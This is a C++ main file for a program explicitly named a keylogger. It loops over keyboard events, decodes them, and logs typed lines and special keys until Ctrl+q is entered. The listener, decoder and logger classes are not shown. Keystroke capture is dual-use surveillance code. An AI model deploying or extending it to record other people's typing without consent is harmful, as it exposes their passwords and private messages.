
#include <iostream>

#include "include/KeyDecoder.hpp"
#include "KeyListener.hpp"
#include "Logger.hpp"

using namespace keylogger;

int main()
{
    try
    {
        KeyListener listener;
        KeyDecoder decoder;
        Logger logger;
        std::string str;
        while (true)
        {
            KeyEvent ev = listener.Listen();
            if (ev.code == 0 && ev.value == 0)
            {
                continue;
            }
            std::string temp = decoder.Decode(ev);
            if (temp.contains("["))
            {
                logger.Log(temp);
                continue;
            }
            str += temp;
            if (str == "Ctrl+q")
            {
                break;
            }
            else if (str.empty())
            {
                continue;
            }
            else if (str.contains("\n"))
            {
                logger.Log(str.substr(0, str.size() - 2));
                str.clear();
            }
        }
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    return 0;
}